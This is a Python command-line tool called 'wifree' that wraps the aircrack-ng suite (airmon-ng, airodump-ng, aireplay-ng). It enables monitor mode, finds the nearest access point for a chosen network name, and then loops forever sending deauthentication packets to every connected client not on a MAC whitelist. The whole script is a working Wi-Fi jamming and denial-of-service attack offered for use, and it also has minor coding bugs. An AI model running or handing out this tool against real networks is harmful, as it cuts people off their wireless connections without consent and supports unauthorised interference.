import argparse
import sys
import os
import time
from WiFree.Settings.ConfigurationParser import ConfigurationParser
from WiFree.Settings.CurrentSettings import CurrentSettings
from WiFree.Settings import DEFAULT_CONFIG_FILE
from WiFree.Aircrack.Airmon import Airmon
from WiFree.Aircrack.Airodump import Airodump
from WiFree.Aircrack.Aireplay import Aireplay

parser = argparse.ArgumentParser(prog='wifree', description='Free your wifi.')
parser.add_argument('-e', '--essid', help='Network essid')
parser.add_argument('-b', '--bssid', help='Network bssid')
parser.add_argument('-i', '--interface', help='Network interface to put in     \
                                                monitor mode')
parser.add_argument('-f', '--file', help='Configuration file')
parser.add_argument('-w', '--whitelist', help='MAC whitelist, comma-separated')
parser.add_argument('-n', help='Number of deauthentication packets to send')
parser.add_argument('--max_sec', help='Max seconds to wait before choosing the \
                                        closest AP')
parser.add_argument('--max_attempts', help='Max attempts of max_sec secs')
parser.add_argument('-v', '--verbose', help='Verbosity on/off')

ESSID = ""
BSSID = ""
VERBOSE = False
SEC = 5
MAX_ATTEMPTS = 1
N = 10

def abort(airmon, airodump):
    if airmon.isDone():
        print("\tDeactivating monitor mode on interface " + airmon.getMonitorInterface())
        airmon.stop()
    if airodump:
        print("\tRemoving trash airodump-ng output")
        os.system("rm " + airodump._airout + "-*")
    raise


if __name__ == '__main__':
    if os.geteuid() != 0:
        print("ERROR: this program must be run as root")
        exit(-1)

    args = parser.parse_args()
    configFilePath = DEFAULT_CONFIG_FILE

    if args.file:
        configFilePath = args.file

    # Initialize configurationParser and read data from configuration file
    configParser = ConfigurationParser(configFilePath)
    # Initialize current configuration with data read from configuration file
    if not configParser.readConfiguration():
        print("ERROR while reading configuration file ("+configFilePath+")")
        exit(-1)

    fileConfiguration = configParser.getConfiguration()
    currentSettings = CurrentSettings(fileConfiguration)

    # Update configuration if new data is available on argv
    if args.essid:
        currentSettings.setEssid(args.essid)
    if args.interface:
        currentSettings.setInterface(args.interface)
    if args.whitelist:
        currentSettings.setWhitelist(" ".join(args.whitelist.split(",")))
    if args.verbose:
        currentSettings.setValue('verbose', "1")
    if args.n:
        currentSettings.setValue('N', args.N)
    if args.max_sec:
        currentSettings.setValue('sec', args.max_sec)
    if args.max_attempts:
        currentSettings.setValue('max_attempts', args.max_attempts)
    if args.bssid:
        BSSID = args.bssid

    if currentSettings.check_error(["verbose", "N", "sec", "max_attempts"]):
        print("ERROR: some setting options are missing")
        print("please check bot the config file and the command line")
        exit(-1)

    VERBOSE = currentSettings.getValue('verbose')
    VERBOSE = True if VERBOSE=="1" else False
    N = currentSettings.getValue('N')
    SEC = currentSettings.getValue('sec')
    MAX_ATTEMPTS = currentSettings.getValue('max_attempts')

    if VERBOSE:
        print("Current settings: ")
        print("\tEssid: " + currentSettings.getEssid())
        print("\tInterface: " + currentSettings.getInterface())
        print("\tWhitelist: " + currentSettings.getWhitelist())
        print("\tN: " + currentSettings.getValue('N'))
        print("\tSEC: " + currentSettings.getValue('sec'))
        print("\tMAX_ATTEMPTS: " + currentSettings.getValue('max_attempts'))
        if BSSID:
            print("\tBSSID: " + BSSID)

    airmon = Airmon(currentSettings.getInterface())
    airodump = False

    try:
        if not airmon.start():
            print("ERROR: " + airmon.error)
            print("Aborting...")
            exit(-1)

        print("Activated monitor mode on interface " + airmon.getInterface())
        print("Monitor interface is " + airmon.getMonitorInterface())

        airodump = Airodump(airmon.getMonitorInterface(), \
                                    currentSettings.getEssid())

        if not BSSID:
            BSSID = airodump.getClosestBSSID(int(SEC), MAX_ATTEMPTS)

            if BSSID:
                print("Got MACs of AP with essid " + currentSettings.getEssid() + ": " + BSSID)
            else:
                print("Couldn't get BSSID for essid " + currentSettings.getEssid())
                print("Aborting...")
                abort(airmon, airodump)
                exit(-1)
        else:
            print("AP BSSID: " + BSSID)

        whitelist = set(currentSettings.getWhitelist().split(" "))
        ESSID = currentSettings.getEssid()

        while True:

            airodump.start(["--bssid", BSSID])
            print("Waiting for connected clients...")

            time.sleep(10)

            aireplay = Aireplay(airmon.getMonitorInterface(), BSSID, False)

            airodump.read_res()

            if not ESSID in airodump._clients:
                print("No clients so far...")
                if VERBOSE:
                    print("clients: " + str(airodump._clients))
                    continue

            clients = set(airodump._clients[ESSID])
            toDeauth = clients-whitelist

            if not toDeauth:
                print("No clients so far...")
                if VERBOSE:
                    print("clients: " + airodump._clients)
                continue

            for cl in toDeauth:
                print("deauthenticating " + cl)
                if aireplay.deauth(N, cl):
                    print("\t...OK")

    except (KeyboardInterrupt, Exception):
        print("Got exception...")
        abort(airmon, airodump)
        raise
